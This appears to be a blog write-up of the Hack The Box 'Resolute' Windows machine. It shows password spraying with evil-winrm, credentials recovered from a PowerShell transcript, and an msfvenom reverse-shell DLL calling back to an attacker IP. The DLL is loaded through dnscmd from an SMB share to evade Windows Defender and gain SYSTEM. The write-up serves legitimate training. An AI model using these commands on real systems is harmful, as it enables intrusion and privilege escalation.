---
layout: default
---
## Resolute
###### Retired [date]
![](https://www.hackthebox.eu/storage/avatars/4c86a642ea237dfde036963e6d182b40.png)

This Windows machine takes advantage of lazy adminstrators, poor PowerShell hygiene, and Windows Defender bypasses.

I started this machine with a quick nmap scan to find open ports
```bash
nmap -p 1-65535 -n -v resolute.htb -T5
```

![](https://yaboygmoney.github.io/htb/images/resolute/nmap1.png)

I followed up with a more in depth nmap scan on a few of the ports that responded. I had a hunch what I needed was one of the first responders.

```bash
nmap -p 53,139,445,636,5985,88 -n resolute.htb -T4 -A -oN nmap.results
```

![](https://yaboygmoney.github.io/htb/images/resolute/nmap2.png)

My next move was to run enum4linux against resolute.htb.

```bash
enum4linux -a resolute.htb
```

This provided the workgroup name, a list of users, and a password. For the account 'marko' we can see a description that says 'Account created. Password set to Welcome123!'. 

![](https://yaboygmoney.github.io/htb/images/resolute/enum.png)

We learned WinRM was enabled from our nmap scan, so I try to use [evil-winrm](https://github.com/Hackplayers/evil-winrm) to login with the credentials found.

```bash
evil-winrm -u marko -p 'Welcome123!' -i resolute.htb
```

..except, no ya don't.

![](https://yaboygmoney.github.io/htb/images/resolute/badpass.png)

Looks like the password won't work for ```marko```. It does appear to be a standard "Welcome to the organization!" password that is set by default. To check it against the user list provided by enum4linux, I ran

```bash
for user in $(cat u.txt); do evil-winrm -u $user -p 'Welcome123!' -i resolute.htb; done
```

It fails a few times, and then I'm able to authentiate as the user 'melanie'.

![](https://yaboygmoney.github.io/htb/images/resolute/loop.png)

A quick get-content command against C:\users\melanie\desktop\user.txt gets the user flag.

![](https://yaboygmoney.github.io/htb/images/resolute/user.png)

After looking around, it doesn't appear as though the user melanie has too many permissions on this system to escalate. Other users with folders on the system are Administrator and Ryan. 

![](https://yaboygmoney.github.io/htb/images/resolute/users.png)

I decide to see what I can see about Ryan.

```powershell
net user ryan
```

![](https://yaboygmoney.github.io/htb/images/resolute/netryan.png)

Ryan is a member of another group: contractors. We don't have much else to go on, so let's see what we can find.

I start at C:\ and see what's what.

```powershell
Get-ChildItem -force
```
There are a few bonus folders in here, namely PSTranscripts. 

![](https://yaboygmoney.github.io/htb/images/resolute/digging.png)

Enumerating that shows an result.

![](https://yaboygmoney.github.io/htb/images/resolute/pstranscript.png)

The file is 3732 bytes of text, so I decide to pull it down to my Kali machine by using ```download Powershell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt``` in Evil-WinRM.

Looking through the file, credentials are easily spotted in a command ryan was using to mount a file share.

![](https://yaboygmoney.github.io/htb/images/resolute/ryancreds.png)

Exit the session as melanie and start a new one as ryan:

```bash
evil-winrm -u ryan -p 'Serv3r4Admin4cc123!' -i resolute.htb
```

![](https://yaboygmoney.github.io/htb/images/resolute/inAsRyan.png)

I immediately check out what sort of cool things Ryan can accomplish with ```whoami /all```.

![](https://yaboygmoney.github.io/htb/images/resolute/ryangroups.png)

Interestingly, Ryan is a member of the DNSAdmins group. Equally interesting, [this blog](https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83) covering exploiting DNSAdmin's abilities to load DLLs with the dnscmd.exe binary.

After learning this, I craft a quick DLL payload with msfvenom.

```bash
msfvenom -p windows/x64/shell_reverse_tcp -f dll LHOST=10.10.14.28 LPORT=1234 > ybgm.dll
```

I start Metasploits exploit/multi/handler to catch the callback, and upload my DLL to the target. Except..

![](https://yaboygmoney.github.io/htb/images/resolute/busted.png)

Windows Defender is busting this payload as soon as it hits the disk. Shay Ber's previously mentioned article does mention that the payload can be called from a UNC path from a remote server. This is important, because Windows Defender only cares if the file is touching Windows Defender's disk. Loading the DLL from a remote server is safe. So to abuse this feature, I need to do a few things:

1. Serve a share folder from Kali, hosting the DLL
2. Mount the share folder so that Ryan can use it
3. Run the dnscmd to config the loading of the bad DLL
4. Restart the DNS service so the DLL is loaded

To accomplish Step 1, I used [Impacket's smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py).

```bash
./smbserver.py YBGM /root/htb/resolute/
```

This command creates an SMB server and share named YBGM, hosting my /root/htb/resolute directory.

![](https://yaboygmoney.github.io/htb/images/resolute/smbsetup.png)

Next, I need to get Ryan using this share. By default, the share doesn't require any authentication, so it's as easy as 

```powershell
net use \\10.10.14.28\ybgm
net use
```

You can see from both the Windows machine and the Kali machine that the connection established.

![](https://yaboygmoney.github.io/htb/images/resolute/mounted.png)

![](https://yaboygmoney.github.io/htb/images/resolute/mounted2.png)

Now I need to run the dnscmd.exe binary to load this DLL and then restart DNS.

```powershell
dnscmd.exe Resolute /config /ServerLevelPlugindll \\10.10.14.28\ybgm\ybgm.dll
sc.exe stop dns
sc.exe start dns
```

![](https://yaboygmoney.github.io/htb/images/resolute/dnscmd.png)

Once DNS comes back up my dll is loaded and a connection is established with my listener.

![](https://yaboygmoney.github.io/htb/images/resolute/metasploit.png)

With the NT AUTHORITY/SYSTEM shell, I can get the contents of C:\users\administrator\desktop\root.txt 

![](https://yaboygmoney.github.io/htb/images/resolute/root.png)
